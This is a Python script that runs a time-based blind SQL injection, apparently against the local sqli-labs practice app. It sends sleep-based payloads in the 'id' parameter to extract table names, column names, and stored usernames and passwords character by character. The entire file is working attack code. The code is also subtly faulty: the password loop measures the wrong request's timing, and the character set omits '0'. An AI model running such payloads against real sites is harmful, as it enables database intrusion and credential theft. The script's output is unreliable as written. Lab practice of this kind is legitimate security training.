#less-9 and for less 10 use id = 1"
import requests
import string
import urllib.parse
import time
alphabet = list(string.ascii_lowercase)
alphabet.append(',')
num=['1', '2','3', '4', '5', '6', '7', '8', '9']
alphabet.extend(num)
lst = list(range(1,200))
#url='http://localhost:1234/Less-8/'
word=""
tables=""
columns=""
password=""
for i in lst:
    for j in alphabet: 
        uwe = f"http://localhost:1234/Less-9/?id=1' AND if ((substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),{i},1)) %3d '{j}',sleep(6),null) --+"
        w = requests.get(uwe)
        s=w.elapsed.total_seconds()
        print(w.url)
        if s>=6 :
            tables=tables+j
            print(tables)



for i  in lst:
    for j in alphabet: 
        we = f"http://localhost:1234/Less-9/?id=1' AND if ((substr((select group_concat(column_name) from information_schema.columns where table_name='emails' limit 0,1),{i},1)) %3d '{j}',sleep(6),null) --+" 
        v= requests.get(we )
        poi=v.elapsed.total_seconds()
        print(v.url)
        if  poi>=6 :
            columns=columns+j
          
            
             


for i  in lst:
    for j in alphabet: 
        rl = f"http://localhost:1234/Less-9/?id=1' AND if ((substr((select group_concat(username) from users limit 0,1),{i},1)) %3d '{j}',sleep(6),null) --+"
        r = requests.get(rl )
        print(r.url)
        mnb= r.elapsed.total_seconds()
        if mnb>=6 :
            word=word+j
           
            
for i  in lst:
    for j in alphabet: 
        drl = f"http://localhost:1234/Less-9/?id=1' AND if((substr((select group_concat(password) from users limit 0,1),{i},1)) %3d '{j}',sleep(6),null) --+"
        qa= requests.get(drl )
        print(qa.url)
        sid= r.elapsed.total_seconds()
        if sid>=6 :
            password=password+j
     
            




            
            
print(tables)            
print(word)               
print(password)
print(columns)












